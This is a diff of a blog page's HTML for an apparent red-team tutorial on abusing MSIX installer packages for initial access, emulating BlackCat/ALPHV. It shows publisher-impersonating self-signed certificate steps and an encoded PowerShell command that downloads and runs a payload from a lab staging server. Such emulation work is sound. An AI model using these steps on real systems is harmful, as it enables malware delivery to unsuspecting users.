@@ -105,7 +105,7 @@
     "keywords": ["Red Teaming","Malware Development","MSIX","SSL","Initial Access"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "1600"
+    "wordCount": "1610"
   }]
   </script>
 
@@ -418,7 +418,7 @@
 <ul>
 <li>I recently worked on a project involving adversary emulation of the <code>BlackCat/ALPHV ransomware operation</code>. Part of the observed TTPs was abuse of the MSIX file format to create malware for initial access. These files come in (.msix) file extension which is a Windows installer package.
 <br></li>
-<li>In this article, we will go over the .msix file format to understand how exactly this package format can be used to execute malicious code on an unsuspecting victim. We will then analyze a malicious sample and further attempt to recreate and test it in a virtual environment.</li>
+<li>In this article, we will go over the <code>.msix</code> file format to understand how exactly this package format can be used to execute malicious code on an unsuspecting victim. We will then analyze a malicious sample and further attempt to recreate and test it in a virtual environment.</li>
 </ul>
 <h2 id="the-msix-file-format" class="relative group">The MSIX File Format <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#the-msix-file-format" aria-label="Anchor">#</a></span></h2>
 <ul>
@@ -443,7 +443,7 @@
 <h2 id="package-support-framework" class="relative group">Package Support Framework <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#package-support-framework" aria-label="Anchor">#</a></span></h2>
 <ul>
 <li>
-<p>The Package Support Framework (PSF), is an open source kit in windows designed to facilitate installation and operation of applications in Windows. It helps one apply fixes to an application without modifying code.</p>
+<p>The <code>Package Support Framework (PSF)</code>, is an open source kit in windows designed to facilitate installation and operation of applications in Windows. It helps one apply fixes to an application without modifying code.</p>
 </li>
 <li>
 <p>It allows for extensive configuration to tailor the behaviour of applications. This customization allows resolving of specific compatibility issues without needing to modify the original code.</p>
@@ -465,8 +465,8 @@
 </ul>
 <h3 id="startingscriptwrapperps1" class="relative group">StartingScriptWrapper.ps1 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#startingscriptwrapperps1" aria-label="Anchor">#</a></span></h3>
 <ul>
-<li>PSF can be used to define post-installation scripts, which will be executed either before or after the application that was packaged has been run.</li>
-<li>To perform this, a configuration item called the StartingScriptWrapper can be defined to tell PSF to run a script after the packaged application finishes installing.</li>
+<li><code>PSF</code> can be used to define post-installation scripts, which will be executed either before or after the application that was packaged has been run.</li>
+<li>To perform this, a configuration item called the <code>StartingScriptWrapper</code> can be defined to tell PSF to run a script after the packaged application finishes installing.</li>
 <li>We can use this to run scripts to stage our implants for Initial Access</li>
 </ul>
 <h2 id="analysis-of-a-malicious-sample" class="relative group">Analysis of a malicious sample <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#analysis-of-a-malicious-sample" aria-label="Anchor">#</a></span></h2>
@@ -500,26 +500,26 @@ sample </a> from malwarebazaar.</li>
 <img src="/posts/2024-06-11_asd/images/appxmanifest.png"> 
 </div>
 <ul>
-<li>The properties contains details identifying the application such as the name, description and the logo that the app uses.</li>
-<li>In the applications section, we can see the PSF executable being launched. There is also a notepad shortcut being created in the common programs folder.</li>
-<li>The Capabilities section is used to specify system capabilities that the application requires in order to grant it access to some system resources and functionalities. Our malware is requesting full trust/unrestricted access to system resources via the <code>runFullTrust</code> capability.</li>
+<li>The <code>properties</code> section contains details identifying the application such as the name, description and the logo that the app uses.</li>
+<li>In the <code>applications</code> section, we can see the PSF executable being launched. There is also a notepad shortcut being created in the common programs folder.</li>
+<li>The <code>Capabilities section</code> is used to specify system capabilities that the application requires in order to grant it access to some system resources and functionalities. Our malware is requesting full trust/unrestricted access to system resources via the <code>runFullTrust</code> capability.</li>
 </ul>
 <h3 id="configjson" class="relative group">Config.json <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#configjson" aria-label="Anchor">#</a></span></h3>
 <ul>
-<li>This is where things start to get interesting!</li>
+<li>This is where things start to get interesting. We can see the various parameters being used in the configuration</li>
 </ul>
 <div class="center">
 <img src="/posts/2024-06-11_asd/images/configfile.png"> 
 </div>
 <ol>
 <li>The PSF executable will be launched.</li>
-<li>scriptExecutionMode has been set to RemoteSigned, which allows scripts that are downloaded from the internet to run if signed by a trusted publisher.</li>
-<li>The start script section defines usJzY.ps1 as the script that will be executed at the start.</li>
-<li>showWindow has been set to false, meaning the powershell script will run in the background without invoking the command window.</li>
+<li><code>scriptExecutionMode</code> has been set to <code>RemoteSigned</code>, which allows scripts that are downloaded from the internet to run if signed by a trusted publisher.</li>
+<li>The <code>start script</code> section defines <code>usJzY.ps1</code> as the script that will be executed at the start.</li>
+<li><code>showWindow</code>  has been set to <code>false</code>, meaning the powershell script will run in the background without invoking the command window.</li>
 </ol>
 <h3 id="startingscriptwrapper" class="relative group">StartingScriptWrapper <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#startingscriptwrapper" aria-label="Anchor">#</a></span></h3>
 <ul>
-<li>The StartingScriptWrapper is required by the PSF to be able to run the target script. The file below is included by default without any special modifications.</li>
+<li>The <code>StartingScriptWrapper</code> is required by the PSF to be able to run the target script. The file below is included by default without any special modifications.</li>
 </ul>
 <div class="center">
 <img src="/posts/2024-06-11_asd/images/startingsciptwrapper.png"> 
@@ -549,7 +549,7 @@ sample </a> from malwarebazaar.</li>
 </ul>
 <h3 id="1-setting-up-the-msix-packaging-tool-and-our-setup-file" class="relative group">1. Setting up the MSIX packaging tool and our setup file <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#1-setting-up-the-msix-packaging-tool-and-our-setup-file" aria-label="Anchor">#</a></span></h3>
 <ul>
-<li>First, you will need to install the MSIX packaging tool from the Microsoft Store</li>
+<li>First, you will need to install the <code>MSIX packaging tool</code> from the Microsoft Store</li>
 </ul>
 <div class="center">
 <img src="/posts/2024-06-11_asd/images/msixpackagingtool.png"> 
@@ -574,11 +574,11 @@ sample </a> from malwarebazaar.</li>
 <img src="/posts/2024-06-11_asd/images/server.png"> 
 <h3 id="3-create-an-ssl-certificate" class="relative group">3. Create an SSL certificate <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#3-create-an-ssl-certificate" aria-label="Anchor">#</a></span></h3>
 <ul>
-<li>When running the MSIX file, Windows will check for the digital signature of the file to ensure it is legitimate and has not been tampered with. If you were to create an MSIX file without signing it, Windows will throw an error to you rejecting the installation process.</li>
-<li>Threat actors will buy or use stolen certificates in order to create legitimately signed files. For this example, we will work with our own self-signed certificate, which we will install the corresponding public key on the target machine in order to bypass the warnings and errors.</li>
+<li>When running the MSIX file, Windows will check for the <code>digital signature</code> of the file to ensure it is legitimate and has not been tampered with. If you were to create an MSIX file without signing it, Windows will throw an error to you rejecting the installation process.</li>
+<li>Threat actors will buy or use stolen certificates in order to create legitimately signed files. For this example, we will work with our own <code>self-signed certificate</code>, which we will install the corresponding public key on the target machine in order to bypass the warnings and errors.</li>
 </ul>
 <ol>
-<li>Create a new self signed certificate</li>
+<li>Create a new self-signed certificate</li>
 </ol>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-SelfSignedCertificate</span> <span class="n">-CertStoreLocation</span> <span class="s2">&#34;Cert:\CurrentUser\My&#34;</span> <span class="n">-TextExtension</span> <span class="vm">@</span><span class="p">(</span><span class="s2">&#34;2.5.29.37={text}1.3.6.1.5.5.7.3.3&#34;</span><span class="p">,</span> <span class="s2">&#34;2.5.29.19={text}&#34;</span><span class="p">)</span><span class="n">-Type</span> <span class="n">Custom</span> <span class="n">-KeyUsage</span> <span class="n">DigitalSignature</span> <span class="n">-Subject</span> <span class="s2">&#34;Asana LLC&#34;</span> <span class="n">-FriendlyName</span> <span class="s2">&#34;Asana LLC&#34;</span>
 </span></span></code></pre></div><p>Subject must much the MSIX&rsquo;s Publisher attribute value.</p>
@@ -652,12 +652,12 @@ sample </a> from malwarebazaar.</li>
 </span></span><span class="line"><span class="cl">  <span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><ul>
-<li>Create the hotfix.ps1 file in a different window. We will add a powershell command that pulls our loader from the staging server and executes it</li>
+<li>Create the <code>hotfix.ps1</code> file in a different window. We will add a powershell command that pulls our loader from the staging server and executes it</li>
 </ul>
 <img src="/posts/2024-06-11_asd/images/cyberchef.png" width=1000px;>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-enc</span> <span class="s2">&#34;dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADcANQAuADEAMgA4AC8AMgA0ADoAOQAwADAAMQAvAEgAbwB0AGYAaQB4AC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADUAOwBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA=&#34;</span>
 </span></span></code></pre></div><ul>
-<li>Add the hotfix.ps1 staging script</li>
+<li>Add the <code>hotfix.ps1</code> staging script</li>
 </ul>
 <img src="/posts/2024-06-11_asd/images/hotfix.png" width=1000px;>
 <ul>
@@ -676,9 +676,20 @@ sample </a> from malwarebazaar.</li>
 <li>Save and exit. Finally create your MSIX file.</li>
 </ul>
 <h2 id="testing-our-malicious-sample" class="relative group">Testing our malicious sample <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#testing-our-malicious-sample" aria-label="Anchor">#</a></span></h2>
-<ul>
-<li>*****  Ensure that the Asana application is not installed in the system</li>
-</ul>
+<div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900">
+  <span class="ltr:pr-3 rtl:pl-3 text-primary-400">
+    
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
+
+  </span>
+
+
+  </span>
+  <span class="dark:text-neutral-300">Ensure that the Asana application is not installed in the system</span>
+</div>
+
 <img src="/posts/2024-06-11_asd/images/asanainstaller2.png">
 <ul>
 <li>Setup our listener</li>
